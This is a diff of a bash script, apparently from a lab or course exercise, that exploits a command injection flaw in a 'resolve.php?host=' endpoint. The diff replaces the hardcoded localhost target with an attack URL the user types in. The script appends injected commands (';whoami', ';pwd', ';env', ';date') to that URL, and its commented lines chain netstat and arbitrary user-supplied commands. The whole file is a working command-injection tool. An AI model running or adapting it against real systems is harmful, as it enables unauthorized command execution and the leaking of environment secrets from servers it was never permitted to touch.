@@ -1,4 +1,7 @@
 #!/bin/bash
+#curl "127.0.0.1:9090/resolve.php?host=fiap.com.br;date;whoami;pwd;netstat+-an+|+grep+-i+"ESTABLISHED";env"
+#read -p "Digite o comando que você quer ver: " C
+#curl "127.0.0.1:9090/resolve.php?host=fiap.com.br;$0"
 echo "
 
 
@@ -18,23 +21,24 @@ Y88b  d88P  888   888  888  888 Y8b.     Y88b.    Y88b. Y88..88P 888
 
 "
 sleep 1s
+read -p "Qual a URL do ataque? " URL
 if [[ $1 == "-h" ]] || [[ $1 == "--help" ]];then
-	echo "All of the commands"
-	echo "------------------------------"
-	echo "	  -d date"
-	echo "	  -w whoami"
-	echo "	  -p pwd"
-	echo "	  -e env"
-	echo "------------------------------"
+        echo "All of the commands"
+        echo "------------------------------"
+        echo "    -d date"
+        echo "    -w whoami"
+        echo "    -p pwd"
+        echo "    -e env"
+        echo "------------------------------"
 elif [[ $1 == "-d" ]];then
-	curl "127.0.0.1:9090/resolve.php?host=fiap.com.br;date"
+        curl "$URL;date"
 elif [[ $1 == "-p" ]];then
-	curl "127.0.0.1:9090/resolve.php?host=fiap.com.br;pwd"
+        curl "$URL;pwd"
 elif [[ $1 == "-w" ]];then
-	curl "127.0.0.1:9090/resolve.php?host=fiap.com.br;whoami"
+        curl "$URL;whoami"
 elif [[ $1 == "-e" ]];then
-	curl "127.0.0.1:9090/resolve.php?host=fiap.com.br;env"
+        curl "$URL;env"
 else
-	echo "If you need help type -h or --help"
-	echo "Usage ./cinjector.sh -h"
+        echo "If you need help type -h or --help"
+        echo "Usage ./resolve.sh -h"
 fi
